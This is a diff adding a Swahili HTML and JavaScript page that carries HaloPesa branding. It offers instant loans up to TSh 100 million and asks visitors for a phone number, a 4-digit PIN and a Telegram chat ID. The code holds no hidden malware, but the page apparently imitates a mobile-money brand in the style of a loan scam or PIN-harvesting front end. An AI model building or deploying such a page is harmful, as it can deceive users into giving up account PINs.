@@ -1,0 +1,756 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HaloPesa Loan System</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
+
+<style>
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:'Poppins',sans-serif;
+}
+
+body{
+background:#efefef;
+}
+
+header{
+background:#d64000;
+height:95px;
+display:flex;
+align-items:center;
+justify-content:space-between;
+padding:0 25px;
+color:#fff;
+position:sticky;
+top:0;
+z-index:100;
+}
+
+.logo{
+display:flex;
+align-items:center;
+gap:12px;
+font-size:18px;
+font-weight:700;
+}
+
+.logo-circle{
+width:48px;
+height:48px;
+border-radius:50%;
+background:#ff7a00;
+display:flex;
+justify-content:center;
+align-items:center;
+font-size:20px;
+}
+
+.logo span{
+color:#ffc400;
+}
+
+.menu{
+font-size:28px;
+cursor:pointer;
+}
+
+.user-section{
+display:none;
+align-items:center;
+gap:15px;
+}
+
+.user-info{
+text-align:right;
+font-size:14px;
+}
+
+.logout-btn{
+background:rgba(255,255,255,0.2);
+border:1px solid #fff;
+color:#fff;
+padding:8px 15px;
+border-radius:6px;
+cursor:pointer;
+font-size:14px;
+transition:0.3s;
+}
+
+.logout-btn:hover{
+background:rgba(255,255,255,0.3);
+}
+
+.hero{
+height:220px;
+background:#ececec;
+}
+
+.container{
+width:92%;
+max-width:650px;
+margin:-120px auto 40px;
+background:#fff;
+border-radius:22px;
+padding:30px;
+box-shadow:0 10px 35px rgba(0,0,0,.12);
+}
+
+.container h1{
+text-align:center;
+font-size:42px;
+color:#222;
+}
+
+.subtitle{
+text-align:center;
+color:#888;
+margin-top:5px;
+font-size:22px;
+margin-bottom:30px;
+}
+
+.screen{
+display:none;
+}
+
+.screen.active{
+display:block;
+}
+
+.loan-box{
+border:1px solid #eee;
+border-radius:18px;
+padding:25px;
+background:#fafafa;
+}
+
+.loan-box h3{
+margin-bottom:25px;
+font-size:26px;
+}
+
+.row{
+display:flex;
+justify-content:space-between;
+margin-bottom:10px;
+font-size:18px;
+}
+
+.value{
+color:#ff6500;
+font-weight:600;
+}
+
+input[type=range]{
+width:100%;
+accent-color:#ff6500;
+margin-bottom:10px;
+}
+
+.labels{
+display:flex;
+justify-content:space-between;
+color:#888;
+margin-bottom:20px;
+}
+
+.payment{
+margin-top:20px;
+padding:20px;
+border-radius:16px;
+background:#fff;
+border:1px solid #eee;
+display:flex;
+justify-content:space-between;
+align-items:center;
+}
+
+.payment p{
+color:#888;
+font-size:18px;
+}
+
+.payment h2{
+color:#ff6500;
+font-size:42px;
+}
+
+button{
+width:100%;
+margin-top:35px;
+padding:18px;
+border:none;
+border-radius:14px;
+font-size:28px;
+font-weight:600;
+color:white;
+cursor:pointer;
+background:linear-gradient(to right,#ff6500,#ff9800);
+transition:all 0.3s ease;
+}
+
+button:hover{
+transform:translateY(-2px);
+box-shadow:0 5px 15px rgba(255, 101, 0, 0.3);
+}
+
+button:active{
+transform:translateY(0);
+}
+
+button:disabled{
+opacity:0.6;
+cursor:not-allowed;
+}
+
+.features{
+display:flex;
+justify-content:space-around;
+margin-top:35px;
+text-align:center;
+}
+
+.feature i{
+font-size:38px;
+color:#ffb300;
+margin-bottom:10px;
+}
+
+.feature h4{
+font-size:18px;
+color:#222;
+}
+
+.feature p{
+font-size:14px;
+color:#777;
+}
+
+.form-box{
+border:1px solid #eee;
+border-radius:18px;
+padding:25px;
+background:#fafafa;
+}
+
+.form-group{
+margin-bottom:20px;
+}
+
+.form-group label{
+display:block;
+margin-bottom:8px;
+font-weight:600;
+color:#333;
+font-size:16px;
+}
+
+.form-group input,
+.form-group select,
+.form-group textarea{
+width:100%;
+padding:12px 15px;
+border:2px solid #e0e0e0;
+border-radius:8px;
+font-size:16px;
+font-family:inherit;
+transition:all 0.3s ease;
+}
+
+.form-group input:focus,
+.form-group select:focus,
+.form-group textarea:focus{
+outline:none;
+border-color:#ff6500;
+box-shadow:0 0 0 3px rgba(255, 101, 0, 0.1);
+}
+
+.form-group textarea{
+resize:vertical;
+min-height:80px;
+}
+
+.form-group small{
+color:#888;
+display:block;
+margin-top:5px;
+}
+
+.message{
+padding:15px;
+border-radius:8px;
+margin-bottom:20px;
+text-align:center;
+font-weight:500;
+animation:slideIn 0.3s ease;
+display:none;
+}
+
+.message.success{
+background:#d4edda;
+color:#155724;
+border:1px solid #c3e6cb;
+}
+
+.message.error{
+background:#f8d7da;
+color:#721c24;
+border:1px solid #f5c6cb;
+}
+
+.message.loading{
+background:#d1ecf1;
+color:#0c5460;
+border:1px solid #bee5eb;
+}
+
+@keyframes slideIn{
+from{
+opacity:0;
+transform:translateY(-10px);
+}
+to{
+opacity:1;
+transform:translateY(0);
+}
+}
+
+.toggle-link{
+text-align:center;
+margin-top:20px;
+font-size:16px;
+color:#666;
+}
+
+.toggle-link a{
+color:#ff6500;
+text-decoration:none;
+font-weight:600;
+cursor:pointer;
+}
+
+.toggle-link a:hover{
+text-decoration:underline;
+}
+
+@media(max-width:600px){
+
+.container h1{
+font-size:28px;
+}
+
+.subtitle{
+font-size:16px;
+}
+
+.payment h2{
+font-size:30px;
+}
+
+button{
+font-size:22px;
+padding:15px;
+}
+
+.feature h4{
+font-size:16px;
+}
+
+.logo span{
+font-size:16px;
+}
+
+header{
+height:70px;
+padding:0 15px;
+}
+}
+</style>
+</head>
+
+<body>
+
+<header>
+<div class="menu">
+<i class="fas fa-bars"></i>
+</div>
+
+<div class="logo">
+<div class="logo-circle">
+<i class="fas fa-umbrella"></i>
+</div>
+<h2>Halo<span>Pesa</span></h2>
+</div>
+
+<div class="user-section" id="userSection">
+<div class="user-info">
+<div id="userPhone" style="font-weight:600;"></div>
+<div style="font-size:12px;">Akaunti</div>
+</div>
+<button class="logout-btn" onclick="logout()">Ondoka</button>
+</div>
+</header>
+
+<div class="hero"></div>
+
+<!-- Login Screen -->
+<div id="loginScreen" class="screen active">
+<div class="container">
+<h1>Ingia Akaunti</h1>
+<div class="subtitle">Karibu tena HaloPesa</div>
+
+<div id="loginMessage" class="message"></div>
+
+<div class="form-box">
+<form id="loginForm">
+<div class="form-group">
+<label for="loginPhone">Nambari ya Simu</label>
+<input type="tel" id="loginPhone" placeholder="+255712345678" required>
+</div>
+
+<div class="form-group">
+<label for="loginPin">PIN (tarakimu 4)</label>
+<input type="password" id="loginPin" maxlength="4" placeholder="••••" required>
+</div>
+
+<button type="submit">INGIA</button>
+</form>
+
+<div class="toggle-link">
+Huna akaunti? <a onclick="showScreen('registerScreen')">Jisajili</a>
+</div>
+</div>
+</div>
+</div>
+
+<!-- Register Screen -->
+<div id="registerScreen" class="screen">
+<div class="container">
+<h1>Jisajili</h1>
+<div class="subtitle">Anzisha akaunti yako HaloPesa</div>
+
+<div id="registerMessage" class="message"></div>
+
+<div class="form-box">
+<form id="registerForm">
+<div class="form-group">
+<label for="registerPhone">Nambari ya Simu</label>
+<input type="tel" id="registerPhone" placeholder="+255712345678" required>
+</div>
+
+<div class="form-group">
+<label for="registerPin">Weka PIN (tarakimu 4)</label>
+<input type="password" id="registerPin" maxlength="4" placeholder="••••" required>
+</div>
+
+<div class="form-group">
+<label for="confirmPin">Rudia PIN</label>
+<input type="password" id="confirmPin" maxlength="4" placeholder="••••" required>
+</div>
+
+<button type="submit">JISAJILI</button>
+</form>
+
+<div class="toggle-link">
+Una akaunti? <a onclick="showScreen('loginScreen')">Ingia</a>
+</div>
+</div>
+</div>
+</div>
+
+<!-- Loan Application Screen -->
+<div id="loanScreen" class="screen">
+<div class="container">
+<h1>Pata Mkopo Wako Haraka</h1>
+<div class="subtitle">Idhini ya haraka • Riba nafuu • Muda rahisi</div>
+
+<div id="loanMessage" class="message"></div>
+
+<div class="loan-box">
+<h3>Kikokotoo cha Mkopo</h3>
+
+<div class="row">
+<span>Kiasi cha Mkopo</span>
+<span class="value" id="amountText">TSh 10,000</span>
+</div>
+
+<input type="range" id="amount" min="10000" max="100000000" value="10000">
+<div class="labels">
+<span>TSh 10K</span>
+<span>TSh 100M</span>
+</div>
+
+<div class="row">
+<span>Muda wa Mkopo</span>
+<span class="value"><span id="monthsText">6</span> miezi</span>
+</div>
+
+<input type="range" id="months" min="6" max="60" value="6">
+<div class="labels">
+<span>miezi 6</span>
+<span>miezi 60</span>
+</div>
+
+<div class="payment">
+<p>Malipo ya Kila Mwezi</p>
+<h2 id="payment">TSh 1,790</h2>
+</div>
+</div>
+
+<form id="loanForm">
+<div class="form-group">
+<label for="telegramChatId">Telegram Chat ID</label>
+<input type="text" id="telegramChatId" placeholder="Nambari yako ya Telegram" required>
+<small>📱 Tuma /start kwa bot yetu ya Telegram kupata Chat ID</small>
+</div>
+
+<div class="form-group">
+<label for="purpose">Madhumuni ya Mkopo</label>
+<textarea id="purpose" placeholder="Eleza madhumuni ya mkopo..." required></textarea>
+</div>
+
+<button type="submit">OMBA SASA</button>
+</form>
+
+<div class="features">
+<div class="feature">
+<i class="fas fa-bolt"></i>
+<h4>Idhini ya Haraka</h4>
+<p>Ndani ya masaa 24</p>
+</div>
+
+<div class="feature">
+<i class="fas fa-sack-dollar"></i>
+<h4>Riba Nafuu</h4>
+<p>Kuanzia 25%</p>
+</div>
+
+<div class="feature">
+<i class="fas fa-lock"></i>
+<h4>Salama</h4>
+<p>Kiwango cha benki</p>
+</div>
+</div>
+</div>
+</div>
+
+<script>
+let currentUser = null;
+
+function initApp(){
+  const userData = localStorage.getItem('user');
+  if(userData){
+    currentUser = JSON.parse(userData);
+    showScreen('loanScreen');
+    updateUserSection();
+  }
+  attachEventListeners();
+}
+
+function attachEventListeners(){
+  const loginForm = document.getElementById('loginForm');
+  if(loginForm) loginForm.addEventListener('submit', handleLogin);
+
+  const registerForm = document.getElementById('registerForm');
+  if(registerForm) registerForm.addEventListener('submit', handleRegister);
+
+  const loanForm = document.getElementById('loanForm');
+  if(loanForm) loanForm.addEventListener('submit', handleLoanSubmit);
+
+  const amountSlider = document.getElementById('amount');
+  const monthsSlider = document.getElementById('months');
+  if(amountSlider) amountSlider.addEventListener('input', calculate);
+  if(monthsSlider) monthsSlider.addEventListener('input', calculate);
+
+  calculate();
+}
+
+function showScreen(screenId){
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  document.getElementById(screenId).classList.add('active');
+}
+
+function calculate(){
+  const amount = document.getElementById('amount');
+  const months = document.getElementById('months');
+  const amountText = document.getElementById('amountText');
+  const monthsText = document.getElementById('monthsText');
+  const payment = document.getElementById('payment');
+
+  let loan = parseInt(amount.value);
+  let term = parseInt(months.value);
+
+  amountText.innerHTML = 'TSh ' + loan.toLocaleString();
+  monthsText.innerHTML = term;
+
+  let interest = 0.25;
+  let total = loan + (loan * interest);
+  let monthly = Math.round(total / term);
+
+  payment.innerHTML = 'TSh ' + monthly.toLocaleString();
+}
+
+function showMessage(text, type, elementId){
+  const messageEl = document.getElementById(elementId);
+  if(messageEl){
+    messageEl.textContent = text;
+    messageEl.className = 'message ' + type;
+    messageEl.style.display = 'block';
+
+    if(type === 'success' || type === 'error'){
+      setTimeout(() => messageEl.style.display = 'none', 5000);
+    }
+  }
+}
+
+async function handleLogin(e){
+  e.preventDefault();
+  const phone = document.getElementById('loginPhone').value.trim();
+  const pin = document.getElementById('loginPin').value;
+
+  showMessage('Inachacha...', 'loading', 'loginMessage');
+
+  try{
+    const response = await fetch('/api/auth/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ phoneNumber: phone, pin })
+    });
+
+    const data = await response.json();
+
+    if(response.ok && data.success){
+      currentUser = { id: data.userId, phone: data.phoneNumber };
+      localStorage.setItem('user', JSON.stringify(currentUser));
+      showMessage('✅ Umefanikiwa kuingia!', 'success', 'loginMessage');
+      setTimeout(() => {
+        showScreen('loanScreen');
+        updateUserSection();
+      }, 1000);
+    } else {
+      showMessage('❌ ' + (data.error || 'Kosa wakati wa kuingia'), 'error', 'loginMessage');
+    }
+  } catch(error){
+    console.error(error);
+    showMessage('❌ Kosa la mtandao', 'error', 'loginMessage');
+  }
+}
+
+async function handleRegister(e){
+  e.preventDefault();
+  const phone = document.getElementById('registerPhone').value.trim();
+  const pin = document.getElementById('registerPin').value;
+  const confirmPin = document.getElementById('confirmPin').value;
+
+  if(pin !== confirmPin){
+    showMessage('❌ PINs haziko sawa', 'error', 'registerMessage');
+    return;
+  }
+
+  if(pin.length !== 4){
+    showMessage('❌ PIN lazima iwe tarakimu 4', 'error', 'registerMessage');
+    return;
+  }
+
+  showMessage('Inajisajili...', 'loading', 'registerMessage');
+
+  try{
+    const response = await fetch('/api/auth/register', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ phoneNumber: phone, pin, confirmPin })
+    });
+
+    const data = await response.json();
+
+    if(response.ok && data.success){
+      showMessage('✅ Jisajili kumefanikiwa! Ingia sasa.', 'success', 'registerMessage');
+      setTimeout(() => {
+        showScreen('loginScreen');
+        document.getElementById('loginForm').reset();
+      }, 1000);
+    } else {
+      showMessage('❌ ' + (data.error || 'Kosa wakati wa jisajili'), 'error', 'registerMessage');
+    }
+  } catch(error){
+    console.error(error);
+    showMessage('❌ Kosa la mtandao', 'error', 'registerMessage');
+  }
+}
+
+async function handleLoanSubmit(e){
+  e.preventDefault();
+
+  const amount = document.getElementById('amount').value;
+  const months = document.getElementById('months').value;
+  const telegramChatId = document.getElementById('telegramChatId').value.trim();
+  const purpose = document.getElementById('purpose').value.trim();
+
+  if(!/^-?\d+$/.test(telegramChatId)){
+    showMessage('❌ Telegram Chat ID si sahihi', 'error', 'loanMessage');
+    return;
+  }
+
+  showMessage('Inatumaini ombi...', 'loading', 'loanMessage');
+
+  try{
+    const response = await fetch('/api/loans/submit', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        name: 'Mkopo Ombi',
+        email: 'user@halopesa.com',
+        phone: currentUser.phone,
+        amount: parseFloat(amount),
+        duration: parseInt(months),
+        purpose,
+        telegramChatId,
+        userId: currentUser.id
+      })
+    });
+
+    const data = await response.json();
+
+    if(response.ok && data.success){
+      showMessage('✅ Ombi limetumwa! ID: ' + data.applicationId, 'success', 'loanMessage');
+      document.getElementById('loanForm').reset();
+      calculate();
+      setTimeout(() => showMessage('', '', 'loanMessage'), 3000);
+    } else {
+      showMessage('❌ ' + (data.error || 'Kosa wakati wa kutumaini ombi'), 'error', 'loanMessage');
+    }
+  } catch(error){
+    console.error(error);
+    showMessage('❌ Kosa la mtandao', 'error', 'loanMessage');
+  }
+}
+
+function updateUserSection(){
+  if(currentUser){
+    document.getElementById('userPhone').textContent = currentUser.phone;
+    document.getElementById('userSection').style.display = 'flex';
+  }
+}
+
+function logout(){
+  if(confirm('Una hakika utaka kuondoka?')){
+    localStorage.removeItem('user');
+    currentUser = null;
+    document.getElementById('userSection').style.display = 'none';
+    showScreen('loginScreen');
+    document.getElementById('loginForm').reset();
+  }
+}
+
+document.addEventListener('DOMContentLoaded', initApp);
+</script>
+
+</body>
+</html>
